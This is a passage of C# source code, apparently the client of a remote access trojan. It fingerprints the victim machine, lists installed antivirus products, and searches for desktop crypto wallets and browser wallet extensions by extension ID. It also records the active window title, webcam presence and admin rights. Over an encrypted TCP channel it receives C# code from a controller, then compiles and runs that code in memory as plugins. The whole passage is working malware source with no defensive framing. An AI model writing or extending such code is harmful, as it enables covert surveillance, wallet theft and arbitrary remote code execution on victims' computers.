            if (result != 0 || type != REG_SZ) return null;

            string value = Encoding.Unicode.GetString(buffer, 0, (int)size);
            int nullIdx = value.IndexOf('\0');
            if (nullIdx >= 0)
                value = value.Substring(0, nullIdx);
            return value.Trim();
        }
        catch
        {
            return null;
        }
        finally
        {
            if (hKey != IntPtr.Zero) RegCloseKey(hKey);
        }
    }

    private static int ReadRegistryDwordWithFlags(string subKey, string valueName, uint samDesired)
    {
        IntPtr hKey = IntPtr.Zero;
        try
        {
            int result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, subKey, 0, samDesired, out hKey);
            if (result != 0) return -1;

            uint type;
            uint size = 4;
            byte[] buffer = new byte[4];
            result = RegQueryValueEx(hKey, valueName, IntPtr.Zero, out type, buffer, ref size);

            if (result != 0 || type != REG_DWORD) return -1;

            return BitConverter.ToInt32(buffer, 0);
        }
        catch
        {
            return -1;
        }
        finally
        {
            if (hKey != IntPtr.Zero) RegCloseKey(hKey);
        }
    }

    private static string GetStableComputerName()
    {
        lock (_computerNameLock)
        {
            if (_cachedComputerName != null)
                return _cachedComputerName;

            string computerName = null;

            try
            {
                uint size = 256;
                StringBuilder nameBuf = new StringBuilder((int)size);
                if (GetComputerName(nameBuf, ref size))
                    computerName = nameBuf.ToString();
            }
            catch { }

            if (string.IsNullOrEmpty(computerName))
            {
                try { computerName = Environment.MachineName; }
                catch { computerName = "UNKNOWN"; }
            }

            _cachedComputerName = computerName;
            return _cachedComputerName;
        }
    }

    private static readonly string MachineIdFilePath = Path.Combine(
        Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
        "trap_panel_machineid.txt");

    private static string GetMachineFingerprint()
    {
        lock (_machineIdLock)
        {
            if (_cachedMachineId != null)
                return _cachedMachineId;

            try
            {
                if (File.Exists(MachineIdFilePath))
                {
                    string id = File.ReadAllText(MachineIdFilePath).Trim();
                    if (!string.IsNullOrWhiteSpace(id) && id.Length >= 16)
                    {
                        _cachedMachineId = id;
                        return _cachedMachineId;
                    }
                }
            }
            catch { }

            string newId = Guid.NewGuid().ToString("N");
            try
            {
                File.WriteAllText(MachineIdFilePath, newId);
                _cachedMachineId = newId;
                return _cachedMachineId;
            }
            catch { }

            StringBuilder components = new StringBuilder();
            components.Append(Guid.NewGuid().ToString("N"));
            _cachedMachineId = components.ToString();
            return _cachedMachineId;
        }
    }

    private static string GetFallbackMachineId()
    {
        lock (_machineIdLock)
        {
            if (_cachedMachineId != null)
                return _cachedMachineId;

            string fallback = "FALLBACK|";

            try { fallback += GetStableComputerName(); }
            catch { fallback += "X"; }
            fallback += "|";

            try { fallback += Environment.UserName; }
            catch { fallback += "X"; }
            fallback += "|";

            try { fallback += Environment.ProcessorCount.ToString(); }
            catch { fallback += "0"; }
            fallback += "|";

            try { fallback += Environment.SystemDirectory; }
            catch { fallback += "X"; }

            fallback += "|";
            try
            {
                uint serialNumber, maxLen, flags;
                StringBuilder volName = new StringBuilder(256);
                StringBuilder fsName = new StringBuilder(256);
                if (GetVolumeInformation("C:\\", volName, 256,
                    out serialNumber, out maxLen, out flags, fsName, 256))
                {
                    fallback += serialNumber.ToString("X8");
                }
                else
                {
                    fallback += "NO_VOL";
                }
            }
            catch { fallback += "NO_VOL"; }

            using (var sha = SHA256.Create())
            {
                byte[] hashBytes = sha.ComputeHash(Encoding.UTF8.GetBytes(fallback));
                _cachedMachineId = BitConverter.ToString(hashBytes).Replace("-", "");
            }

            Log("[FINGERPRINT] Using fallback hash: " + _cachedMachineId.Substring(0, 16) + "...");
            return _cachedMachineId;
        }
    }

    // ==================== System Info ====================

    private static string GetWindowsVersion()
    {
        try
        {
            var osvi = new OSVERSIONINFOEX();
            osvi.dwOSVersionInfoSize = Marshal.SizeOf(typeof(OSVERSIONINFOEX));
            int ntStatus = RtlGetVersion(ref osvi);

            int major, minor, build;
            if (ntStatus == 0)
            {
                major = osvi.dwMajorVersion;
                minor = osvi.dwMinorVersion;
                build = osvi.dwBuildNumber;
            }
            else
            {
                var env = Environment.OSVersion.Version;
                major = env.Major;
                minor = env.Minor;
                build = env.Build;
            }

            string productName = ReadRegistryString64(
                "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName");
            string displayVersion = ReadRegistryString64(
                "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "DisplayVersion");
            string editionId = ReadRegistryString64(
                "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "EditionID");
            int ubr = ReadRegistryDword64(
                "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "UBR");

            string osName;

            if (major == 10 && minor == 0 && build >= 22000)
            {
                string edition = "";
                if (!string.IsNullOrEmpty(editionId))
                    edition = " " + FormatEditionName(editionId);
                else if (!string.IsNullOrEmpty(productName) && productName.Contains(" "))
                {
                    int lastSpace = productName.LastIndexOf(' ');
                    if (lastSpace > 0)
                    {
                        string tail = productName.Substring(lastSpace + 1);
                        if (tail != "10" && tail != "11")
                            edition = " " + tail;
                    }
                }
                osName = "Windows 11" + edition;
            }
            else if (major == 10 && minor == 0)
            {
                string edition = "";
                if (!string.IsNullOrEmpty(editionId))
                    edition = " " + FormatEditionName(editionId);

                if (string.IsNullOrEmpty(edition) && !string.IsNullOrEmpty(productName)
                    && productName.StartsWith("Windows 10"))
                {
                    osName = productName;
                }
                else
                {
                    osName = "Windows 10" + edition;
                }
            }
            else if (!string.IsNullOrEmpty(productName))
            {
                osName = productName;
            }
            else
            {
                switch (major)
                {
                    case 6:
                        switch (minor)
                        {
                            case 3: osName = "Windows 8.1"; break;
                            case 2: osName = "Windows 8"; break;
                            case 1: osName = "Windows 7"; break;
                            case 0: osName = "Windows Vista"; break;
                            default: osName = "Windows " + major + "." + minor; break;
                        }
                        break;
                    case 5:
                        osName = minor == 1 ? "Windows XP" : "Windows " + major + "." + minor;
                        break;
                    default:
                        osName = "Windows " + major + "." + minor;
                        break;
                }
            }

            if (!string.IsNullOrEmpty(displayVersion))
                osName += " " + displayVersion;

            string buildStr = build.ToString();
            if (ubr > 0)
                buildStr += "." + ubr;
            osName += " (Build " + buildStr + ")";

            osName += IntPtr.Size == 8 ? " x64" : " x86";

            return osName;
        }
        catch (Exception ex)
        {
            Log("GetWindowsVersion error: " + ex.Message);

            try
            {
                var os = Environment.OSVersion.Version;
                string basic;
                if (os.Major == 10 && os.Build >= 22000)
                    basic = "Windows 11";
                else if (os.Major == 10)
                    basic = "Windows 10";
                else if (os.Major == 6 && os.Minor == 3)
                    basic = "Windows 8.1";
                else if (os.Major == 6 && os.Minor == 1)
                    basic = "Windows 7";
                else
                    basic = "Windows " + os.Major + "." + os.Minor;

                basic += " (Build " + os.Build + ")";
                basic += IntPtr.Size == 8 ? " x64" : " x86";
                return basic;
            }
            catch
            {
                return "Unknown Windows";
            }
        }
    }

    private static string FormatEditionName(string editionId)
    {
        if (string.IsNullOrEmpty(editionId)) return "";

        switch (editionId)
        {
            case "Professional": return "Pro";
            case "ProfessionalN": return "Pro N";
            case "ProfessionalWorkstation": return "Pro for Workstations";
            case "ProfessionalEducation": return "Pro Education";
            case "Enterprise": return "Enterprise";
            case "EnterpriseN": return "Enterprise N";
            case "EnterpriseS": return "Enterprise LTSC";
            case "EnterpriseSN": return "Enterprise LTSC N";
            case "Education": return "Education";
            case "EducationN": return "Education N";
            case "Core": return "Home";
            case "CoreN": return "Home N";
            case "CoreSingleLanguage": return "Home Single Language";
            case "CoreCountrySpecific": return "Home China";
            case "ServerStandard": return "Server Standard";
            case "ServerDatacenter": return "Server Datacenter";
            case "IoTEnterprise": return "IoT Enterprise";
            case "IoTEnterpriseS": return "IoT Enterprise LTSC";
            default: return editionId;
        }
    }

    private static string ReadRegistryString(string subKey, string valueName)
    {
        IntPtr hKey = IntPtr.Zero;
        try
        {
            int result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, subKey, 0, KEY_READ, out hKey);
            if (result != 0) return null;

            uint type;
            uint size = 512;
            byte[] buffer = new byte[size];
            result = RegQueryValueEx(hKey, valueName, IntPtr.Zero, out type, buffer, ref size);

            if (result != 0 || type != REG_SZ) return null;

            string value = Encoding.Unicode.GetString(buffer, 0, (int)size);
            int nullIdx = value.IndexOf('\0');
            if (nullIdx >= 0)
                value = value.Substring(0, nullIdx);
            return value.Trim();
        }
        catch
        {
            return null;
        }
        finally
        {
            if (hKey != IntPtr.Zero) RegCloseKey(hKey);
        }
    }

    private static int ReadRegistryDword(string subKey, string valueName)
    {
        IntPtr hKey = IntPtr.Zero;
        try
        {
            int result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, subKey, 0, KEY_READ, out hKey);
            if (result != 0) return -1;

            uint type;
            uint size = 4;
            byte[] buffer = new byte[4];
            result = RegQueryValueEx(hKey, valueName, IntPtr.Zero, out type, buffer, ref size);

            if (result != 0 || type != REG_DWORD) return -1;

            return BitConverter.ToInt32(buffer, 0);
        }
        catch
        {
            return -1;
        }
        finally
        {
            if (hKey != IntPtr.Zero) RegCloseKey(hKey);
        }
    }

    private static string GetSpecificAntivirus()
    {
        List<string> avProducts = new List<string>();
        Dictionary<string, string> avPaths = new Dictionary<string, string>
        {
            {"Norton", "SOFTWARE\\Norton"},
            {"McAfee", "SOFTWARE\\McAfee"},
            {"Kaspersky", "SOFTWARE\\Kaspersky Lab"},
            {"Bitdefender", "SOFTWARE\\Bitdefender"},
            {"Avast", "SOFTWARE\\AVAST Software"},
            {"AVG", "SOFTWARE\\AVG Technologies"},
            {"Windows Defender", "SOFTWARE\\Microsoft\\Windows Defender"},
            {"ESET", "SOFTWARE\\ESET"},
            {"Malwarebytes", "SOFTWARE\\Malwarebytes"},
            {"Trend Micro", "SOFTWARE\\TrendMicro"},
            {"Sophos", "SOFTWARE\\Sophos"},
            {"Webroot", "SOFTWARE\\WRData"}
        };

        foreach (var av in avPaths)
        {
            try
            {
                IntPtr hKey;
                int result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, av.Value, 0, KEY_READ | KEY_WOW64_64KEY, out hKey);
                if (result == 0)
                {
                    avProducts.Add(av.Key);
                    RegCloseKey(hKey);
                    continue;
                }

                result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, av.Value, 0, KEY_READ, out hKey);
                if (result == 0)
                {
                    avProducts.Add(av.Key);
                    RegCloseKey(hKey);
                }
            }
            catch { }
        }

        return avProducts.Count == 0 ? "None" : string.Join(", ", avProducts.Distinct());
    }

    private static string GetWalletNames()
    {
        List<string> walletNames = new List<string>();

        string appData = "";
        string localAppData = "";
        string myDocuments = "";

        try { appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData); }
        catch { }
        try { localAppData = Environment.GetEnvironmentVariable("LOCALAPPDATA") ?? ""; }
        catch { }
        try { myDocuments = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments); }
        catch { }

        if (string.IsNullOrEmpty(appData)) return "None";

        Dictionary<string, string> walletPaths = new Dictionary<string, string>
        {
            {"Armory", Path.Combine(appData, "Armory")},
            {"Atomic", Path.Combine(appData, "Atomic", "Local Storage", "leveldb")},
            {"Bitcoin", Path.Combine(appData, "Bitcoin", "wallets")},
            {"Bytecoin", Path.Combine(appData, "bytecoin")},
            {"Dash", Path.Combine(appData, "DashCore", "wallets")},
            {"Electrum", Path.Combine(appData, "Electrum", "wallets")},
            {"Ethereum", Path.Combine(appData, "Ethereum", "keystore")},
            {"Exodus", Path.Combine(appData, "Exodus", "exodus.wallet")},
            {"Guarda", Path.Combine(appData, "Guarda", "Local Storage", "leveldb")},
            {"Jaxx", Path.Combine(appData, "com.liberty.jaxx", "IndexedDB")},
            {"Litecoin", Path.Combine(appData, "Litecoin", "wallets")},
            {"WalletWasabi", Path.Combine(appData, "WalletWasabi", "Client", "Wallets")},
            {"Ledger Live", Path.Combine(appData, "Ledger Live")},
            {"Trezor Suite", Path.Combine(appData, "@trezor", "suite-desktop")}
        };

        if (!string.IsNullOrEmpty(localAppData))
            walletPaths["Coinomi"] = Path.Combine(localAppData, "Coinomi", "Coinomi", "wallets");

        if (!string.IsNullOrEmpty(myDocuments))
            walletPaths["Monero GUI"] = Path.Combine(myDocuments, "Monero", "wallets");

        foreach (var wallet in walletPaths)
        {
            try
            {
                if (Directory.Exists(wallet.Value))
                    walletNames.Add(wallet.Key);
            }
            catch { }
        }

        if (!string.IsNullOrEmpty(localAppData))
        {
            Dictionary<string, string> browserPaths = new Dictionary<string, string>
            {
                {"Brave", Path.Combine(localAppData, "BraveSoftware", "Brave-Browser", "User Data")},
                {"Chrome", Path.Combine(localAppData, "Google", "Chrome", "User Data")},
                {"Edge", Path.Combine(localAppData, "Microsoft", "Edge", "User Data")},
                {"Opera", Path.Combine(appData, "Opera Software", "Opera Stable")},
                {"OperaGX", Path.Combine(appData, "Opera Software", "Opera GX Stable")},
                {"Vivaldi", Path.Combine(localAppData, "Vivaldi", "User Data")},
                {"Chromium", Path.Combine(localAppData, "Chromium", "User Data")}
            };

            Dictionary<string, string> walletDirs = new Dictionary<string, string>
            {
                {"nkbihfbeogaeaoehlefnkodbefgpgknn", "Metamask"},
                {"ejbalbakoplchlghecdalmeeeajnimhm", "Metamask2"},
                {"odbfpeeihdkbihmopkbjmoonfanlbfcl", "Coinbase"},
                {"hifafgmccdpekplomjjkcfgodnhcellj", "Crypto.com"},
                {"bfnaelmomeimhlpmgjnjophhpkkoljpa", "Phantom"},
                {"ibnejdfjmmkpcnlpebklmnkoeoihofec", "TronLink"},
                {"egjidjbpglichdcondbcbdnbeeppgdph", "Trust Wallet"},
                {"dmkamcknogkgcdfhhbddcghachkejeap", "Keplr"},
                {"fhbohimaelbohpjbbldcngcnapndodjp", "Binance Chain"},
                {"afbcbjpbpfadlkmhmclhkeeodmamcflc", "MathWallet"},
                {"aholpfdialjgjfhomihkjbmgjidlcdno", "ExodusWeb3"},
                {"kkpllkodjeloidieedojogacfhpaihoh", "Enkrypt"},
                {"mcbigmjiafegjnnogedioegffbooigli", "Ethos Sui"},
                {"hpglfhgfnhbgpjdenjgmdgoeiappafln", "Guarda Wallet"},
                {"mcohilncbfahbmgdjkbpemcciiolgcge", "OKX"},
                {"jnmbobjmhlngoefaiojfljckilhhlhcj", "OneKey"},
                {"fnjhmkhhmkbjkkabndcnnogagogbneec", "Ronin"},
                {"lgmpcpglpngdoalbgeoldeajfclnhafa", "SafePal"},
                {"mfgccjchihfkkindfppnaooecgfneiii", "TokenPocket"},
                {"nphplpgoakhhjchkkhmiggakijnkhfnd", "Ton"},
                {"amkmjjmmflddogmhpjloimipbofnfjih", "Wombat"},
                {"dlcobpjiigpikoobohmabehhmhfoodbb", "Argent X"},
                {"jiidiaalihmmhddjgbnbgdfflelocpak", "BitKeep"},
                {"bopcbmipnjdcdfflfgjdgdjejmgpoaab", "BlockWallet"},
                {"heamnjbnflcikcggoiplibfommfbkjpj", "Zeal"}
            };

            foreach (var browser in browserPaths)
            {
                try
                {
                    if (Directory.Exists(browser.Value))
                    {
                        foreach (var wd in walletDirs)
                        {
                            string extPath1 = Path.Combine(browser.Value, "Default",
                                "Local Extension Settings", wd.Key);
                            string extPath2 = Path.Combine(browser.Value,
                                "Local Extension Settings", wd.Key);

                            if (Directory.Exists(extPath1) || Directory.Exists(extPath2))
                                walletNames.Add(wd.Value);
                        }
                    }
                }
                catch { }
            }
        }

        return walletNames.Count == 0 ? "None" : string.Join(", ", walletNames.Distinct());
    }

    private static string GetActiveWindowTitle()
    {
        try
        {
            IntPtr hwnd = GetForegroundWindow();
            if (hwnd == IntPtr.Zero) return "";
            StringBuilder sb = new StringBuilder(256);
            GetWindowText(hwnd, sb, 256);
            return sb.ToString();
        }
        catch { return ""; }
    }

    private static string DetectWebcam()
    {
        try
        {
            string[] subKeys = Registry.LocalMachine.OpenSubKey(
                @"SYSTEM\CurrentControlSet\Control\Class\{e5323777-f976-4f5b-9b55-b94699c46e44}")?
                .GetSubKeyNames();
            if (subKeys != null)
            {
                foreach (string sub in subKeys)
                {
                    string desc = Registry.LocalMachine.OpenSubKey(
                        @"SYSTEM\CurrentControlSet\Control\Class\{e5323777-f976-4f5b-9b55-b94699c46e44}\" + sub)?
                        .GetValue("DriverDesc")?.ToString();
                    if (!string.IsNullOrEmpty(desc) && !sub.Equals("DriverDesc", StringComparison.OrdinalIgnoreCase))
                        return "Yes";
                }
            }
            return "No";
        }
        catch { return "Unknown"; }
    }

    private static string GetSystemInfo()
    {
        string osVer;
        try { osVer = GetWindowsVersion(); }
        catch { osVer = "Unknown"; }

        string machine;
        try { machine = GetStableComputerName(); }
        catch { machine = "Unknown"; }

        string av;
        try { av = GetSpecificAntivirus(); }
        catch { av = "Unknown"; }

        string wallets;
        try { wallets = GetWalletNames(); }
        catch { wallets = "Unknown"; }

        string isAdmin;
        try { isAdmin = new System.Security.Principal.WindowsPrincipal(System.Security.Principal.WindowsIdentity.GetCurrent()).IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator) ? "Yes" : "No"; }
        catch { isAdmin = "Unknown"; }

        string hasWebcam;
        try { hasWebcam = DetectWebcam(); }
        catch { hasWebcam = "Unknown"; }

        return osVer + "|" + machine + "|" + av + "|" + wallets + "|" + isAdmin + "|" + hasWebcam;
    }

    // ==================== TCP Protocol ====================

    private static void ReadExactRaw(Stream stream, byte[] buffer, int offset, int count)
    {
        int totalRead = 0;
        while (totalRead < count)
        {
            int read = stream.Read(buffer, offset + totalRead, count - totalRead);
            if (read <= 0) throw new Exception("Connection closed during key exchange");
            totalRead += read;
        }
    }

    private static byte[] DeriveHmacKey(byte[] aesKey)
    {
        using (var sha = SHA256.Create())
            return sha.ComputeHash(Encoding.UTF8.GetBytes("HMAC-" + BytesToHex(aesKey)));
    }

    private static string BytesToHex(byte[] bytes)
    {
        var sb = new StringBuilder(bytes.Length * 2);
        foreach (byte b in bytes)
            sb.Append(b.ToString("x2"));
        return sb.ToString();
    }

    private static bool ConstantTimeEquals(byte[] a, byte[] b)
    {
        if (a.Length != b.Length) return false;
        int diff = 0;
        for (int i = 0; i < a.Length; i++)
            diff |= a[i] ^ b[i];
        return diff == 0;
    }

    private static void WriteEncryptedMessage(Stream stream, byte msgType, byte[] payload, byte[] aesKey)
    {
        int payloadLen = payload != null ? payload.Length : 0;
        int plaintextLen = 1 + payloadLen;
        byte[] plaintext = new byte[plaintextLen];
        plaintext[0] = msgType;
        if (payloadLen > 0)
            Buffer.BlockCopy(payload, 0, plaintext, 1, payloadLen);

        byte[] iv = new byte[16];
        using (var rng = RandomNumberGenerator.Create())
            rng.GetBytes(iv);

        byte[] ciphertext;
        using (var aes = Aes.Create())
        {
            aes.Key = aesKey;
            aes.IV = iv;
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;
            using (var enc = aes.CreateEncryptor())
                ciphertext = enc.TransformFinalBlock(plaintext, 0, plaintextLen);
        }

        byte[] ivCipher = new byte[16 + ciphertext.Length];
        Buffer.BlockCopy(iv, 0, ivCipher, 0, 16);
        Buffer.BlockCopy(ciphertext, 0, ivCipher, 16, ciphertext.Length);

        byte[] hmacKey = DeriveHmacKey(aesKey);
        byte[] hmac;
        using (var h = new HMACSHA256(hmacKey))
            hmac = h.ComputeHash(ivCipher);

        byte[] packet = new byte[4 + ivCipher.Length + 32];
        int totalLen = ivCipher.Length + 32;
        packet[0] = (byte)(totalLen & 0xFF);
        packet[1] = (byte)((totalLen >> 8) & 0xFF);
        packet[2] = (byte)((totalLen >> 16) & 0xFF);
        packet[3] = (byte)((totalLen >> 24) & 0xFF);
        Buffer.BlockCopy(ivCipher, 0, packet, 4, ivCipher.Length);
        Buffer.BlockCopy(hmac, 0, packet, 4 + ivCipher.Length, 32);

        stream.Write(packet, 0, packet.Length);
        stream.Flush();
    }

    private static byte[] ReadTcpExact(Stream stream, int count)
    {
        byte[] buffer = new byte[count];
        int totalRead = 0;
        while (totalRead < count)
        {
            int read = stream.Read(buffer, totalRead, count - totalRead);
            if (read <= 0) return null;
            totalRead += read;
        }
        return buffer;
    }

    private class TcpMessage
    {
        public byte Type { get; set; }
        public byte[] Payload { get; set; }
    }

    private static TcpMessage ReadEncryptedMessage(Stream stream, byte[] aesKey)
    {
        byte[] lenBuf = ReadTcpExact(stream, 4);
        if (lenBuf == null) return null;

        int totalLen = lenBuf[0] | (lenBuf[1] << 8) | (lenBuf[2] << 16) | (lenBuf[3] << 24);
        if (totalLen <= 32 || totalLen > MaxMessageSize + 16 + 32)
        {
            Log("Invalid message length: " + totalLen);
            return null;
        }

        byte[] data = ReadTcpExact(stream, totalLen);
        if (data == null) return null;

        byte[] ivCipher = new byte[totalLen - 32];
        byte[] receivedHmac = new byte[32];
        Buffer.BlockCopy(data, 0, ivCipher, 0, ivCipher.Length);
        Buffer.BlockCopy(data, ivCipher.Length, receivedHmac, 0, 32);

        byte[] hmacKey = DeriveHmacKey(aesKey);
        byte[] computedHmac;
        using (var h = new HMACSHA256(hmacKey))
            computedHmac = h.ComputeHash(ivCipher);

        if (!ConstantTimeEquals(computedHmac, receivedHmac))
        {
            Log("HMAC verification failed!");
            return null;
        }

        if (ivCipher.Length < 16)
            return null;

        byte[] iv = new byte[16];
        byte[] ciphertext = new byte[ivCipher.Length - 16];
        Buffer.BlockCopy(ivCipher, 0, iv, 0, 16);
        Buffer.BlockCopy(ivCipher, 16, ciphertext, 0, ciphertext.Length);

        byte[] plaintext;
        using (var aes = Aes.Create())
        {
            aes.Key = aesKey;
            aes.IV = iv;
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;
            using (var dec = aes.CreateDecryptor())
                plaintext = dec.TransformFinalBlock(ciphertext, 0, ciphertext.Length);
        }

        if (plaintext.Length < 1)
            return null;

        byte msgType = plaintext[0];
        byte[] payload = null;
        if (plaintext.Length > 1)
        {
            payload = new byte[plaintext.Length - 1];
            Buffer.BlockCopy(plaintext, 1, payload, 0, payload.Length);
        }

        return new TcpMessage { Type = msgType, Payload = payload };
    }

    // ==================== Plugin Management ====================

    private static void HandlePluginCmd(byte[] payload)
    {
        if (payload == null || payload.Length < 2) return;
        int idLen = payload[0];
        if (idLen <= 0 || (idLen + 1) > payload.Length) return;

        string pluginId = Encoding.UTF8.GetString(payload, 1, idLen);
        int dataOffset = 1 + idLen;
        int dataLen = payload.Length - dataOffset;
        byte[] data = null;

        if (dataLen > 0)
        {
            data = new byte[dataLen];
            Buffer.BlockCopy(payload, dataOffset, data, 0, dataLen);
        }

        if (data != null && data.Length >= 1)
        {
            int cmdType = data[0];
            byte[] cmdData = null;

            if (data.Length > 1)
            {
                cmdData = new byte[data.Length - 1];
                Buffer.BlockCopy(data, 1, cmdData, 0, cmdData.Length);
            }

            InvokePluginCommand(pluginId, cmdType, cmdData);
        }
    }

    private static void InvokePluginCommand(string pluginId, int cmdType, byte[] data)
    {
        switch (cmdType)
        {
            case 0: // Load plugin
                Log("[Plugin] Loading: " + pluginId);
                if (activePlugins.ContainsKey(pluginId)) StopPlugin(pluginId);

                try
                {
                    string code = Encoding.UTF8.GetString(data);
                    Assembly assembly = CompilePluginCode(pluginId, code);
                    if (assembly == null) return;

                    string typeName = "ClientPlugin_" + pluginId + ".Main";
                    Type pluginType = assembly.GetType(typeName);

                    if (pluginType == null)
                    {
                        foreach (Type t in assembly.GetExportedTypes())
                        {
                            if (t.Name == "Main")
                            {
                                pluginType = t;
                                break;
                            }
                        }
                    }

                    if (pluginType == null)
                    {
                        Log("[Plugin] No 'Main' class found in plugin: " + pluginId);
                        foreach (Type t in assembly.GetExportedTypes())
                            Log("[Plugin]   Available type: " + t.FullName);
                        return;
                    }

                    object pluginInstance = Activator.CreateInstance(pluginType);
                    PluginRunner runner = new PluginRunner();
                    runner.Start(pluginInstance);
                    activePlugins[pluginId] = new PluginEntry { Runner = runner };
                    Log("[Plugin] Started: " + pluginId);
                }
                catch (Exception ex)
                {
                    Log("[Plugin] Load error: " + ex.Message);
                    if (ex.InnerException != null)
                        Log("[Plugin] Inner error: " + ex.InnerException.Message);
                    activePlugins.Remove(pluginId);
                }
                break;

            case 1: // Send data to plugin
                if (activePlugins.ContainsKey(pluginId))
                    activePlugins[pluginId].Runner.InQueue.Enqueue(data);
                break;

            case 2: // Stop plugin
                StopPlugin(pluginId);
                break;
        }
    }

    private static Assembly CompilePluginCode(string pluginId, string code)
    {
        try
        {
            return CompileViaCodeDom(pluginId, code);
        }
        catch (Exception ex)
        {
            Log("[Plugin] Compile error: " + ex.Message);
            if (ex.InnerException != null)
                Log("[Plugin] Inner: " + ex.InnerException.Message);
            return null;
        }
    }

    private static string ResolveAssemblyPath(string assemblyFileName)
    {
        string frameworkDir = RuntimeEnvironment.GetRuntimeDirectory();
        if (!string.IsNullOrEmpty(frameworkDir))
        {
            string fullPath = Path.Combine(frameworkDir, assemblyFileName);
            if (File.Exists(fullPath))
                return fullPath;

            string facadesPath = Path.Combine(frameworkDir, "Facades", assemblyFileName);
            if (File.Exists(facadesPath))
                return facadesPath;

            string wpfPath = Path.Combine(frameworkDir, "WPF", assemblyFileName);
            if (File.Exists(wpfPath))
                return wpfPath;
        }

        try
        {
            string nameWithoutExt = Path.GetFileNameWithoutExtension(assemblyFileName);
            Assembly asm = Assembly.Load(nameWithoutExt);
            if (asm != null && !string.IsNullOrEmpty(asm.Location) && File.Exists(asm.Location))
                return asm.Location;
        }
        catch { }

        return null;
    }

    private static Assembly CompileViaCodeDom(string pluginId, string code)
    {
        Type providerType = null;

        try
        {
            providerType = Type.GetType(
                "Microsoft.CSharp.CSharpCodeProvider, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089");
        }
        catch { }

        if (providerType == null)
        {
            try
            {
                Assembly codedomAsm = Assembly.Load("Microsoft.CSharp");
                providerType = codedomAsm.GetType("Microsoft.CSharp.CSharpCodeProvider");
            }
            catch { }
        }

        if (providerType == null)
        {
            Log("[Plugin] No C# compiler available.");
            return null;
        }

        object provider = Activator.CreateInstance(providerType);

        try
        {
            Type paramsType = Type.GetType(
                "System.CodeDom.Compiler.CompilerParameters, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089");

            if (paramsType == null)
            {
                Log("[Plugin] CompilerParameters type not found");
                return null;
            }

            object parameters = Activator.CreateInstance(paramsType);
            paramsType.GetProperty("GenerateInMemory").SetValue(parameters, true, null);
            paramsType.GetProperty("GenerateExecutable").SetValue(parameters, false, null);

            PropertyInfo refsProperty = paramsType.GetProperty("ReferencedAssemblies");
            if (refsProperty != null)
            {
                object refs = refsProperty.GetValue(parameters, null);
                MethodInfo addMethod = refs.GetType().GetMethod("Add", new[] { typeof(string) });
                if (addMethod != null)
                {
                    string[] candidateAssemblies = new string[]
                    {
                        "mscorlib.dll",
                        "System.dll",
                        "System.Core.dll",
                        "System.Data.dll",
                        "System.Drawing.dll",
                        "System.IO.Compression.dll",
                        "System.IO.Compression.FileSystem.dll",
                        "System.Net.Http.dll",
                        "System.Runtime.Serialization.dll",
                        "System.Security.dll",
                        "System.Speech.dll",
                        "System.Windows.Forms.dll",
                        "System.Xml.dll",
                        "System.Xml.Linq.dll",
                        "Microsoft.CSharp.dll",
                        "System.Numerics.dll",
                        "System.Configuration.dll",
                        "System.ServiceModel.dll",
                        "System.Web.dll",
                        "System.Web.Extensions.dll",
                        "System.ServiceProcess.dll",
                    };

                    int added = 0;
                    int skipped = 0;

                    foreach (string candidate in candidateAssemblies)
                    {
                        string resolved = ResolveAssemblyPath(candidate);
                        if (resolved != null)
                        {
                            try
                            {
                                addMethod.Invoke(refs, new object[] { resolved });
                                added++;
                            }
                            catch { skipped++; }
                        }
                        else
                        {
                            skipped++;
                        }
                    }

                    Log("[Plugin] References: " + added + " added, " + skipped + " not found (OK)");

                    try
                    {
                        string selfPath = Assembly.GetExecutingAssembly().Location;
                        if (!string.IsNullOrEmpty(selfPath) && File.Exists(selfPath))
                            addMethod.Invoke(refs, new object[] { selfPath });
                    }
                    catch { }
                }
            }

            MethodInfo compileMethod = providerType.GetMethod("CompileAssemblyFromSource",
                new[] { paramsType, typeof(string[]) });

            if (compileMethod == null)
            {
                Log("[Plugin] CompileAssemblyFromSource not found");
                return null;
            }

            object results = compileMethod.Invoke(provider,
                new object[] { parameters, new[] { code } });

            PropertyInfo errorsProperty = results.GetType().GetProperty("Errors");
            if (errorsProperty != null)
            {
                object errors = errorsProperty.GetValue(results, null);
                PropertyInfo hasErrorsProperty = errors.GetType().GetProperty("HasErrors");
                if (hasErrorsProperty != null && (bool)hasErrorsProperty.GetValue(errors, null))
                {
                    foreach (object error in (System.Collections.IEnumerable)errors)
                        Log("Plugin compile error: " + error.ToString());
                    return null;
                }
            }

            PropertyInfo compiledAsmProperty = results.GetType().GetProperty("CompiledAssembly");
            if (compiledAsmProperty != null)
                return (Assembly)compiledAsmProperty.GetValue(results, null);

            return null;
        }
        finally
        {
            if (provider is IDisposable)
                ((IDisposable)provider).Dispose();
        }
    }

    private static void StopPlugin(string pluginId)
    {
        if (activePlugins.ContainsKey(pluginId))
        {
            try { activePlugins[pluginId].Runner.Stop(); }
            catch { }
            activePlugins.Remove(pluginId);
            Log("[Plugin] Stopped: " + pluginId);
        }
    }

    private static void StopAllPlugins()
    {
        foreach (string plugId in activePlugins.Keys.ToArray())
            StopPlugin(plugId);
    }

    private static void CleanupDeadPlugins()
    {
        foreach (string plugId in activePlugins.Keys.ToArray())
        {
            PluginEntry pe = activePlugins[plugId];
            if (pe != null && pe.Runner != null)
            {
                if (pe.Runner.LastError != null)
                {
                    Log("[Plugin] " + plugId + " died: " + pe.Runner.LastError.Message);
                    pe.Runner.Stop();
                    activePlugins.Remove(plugId);
                }
                else if (!pe.Runner.Running && pe.Runner.WorkerThread != null
                    && !pe.Runner.WorkerThread.IsAlive)
                {
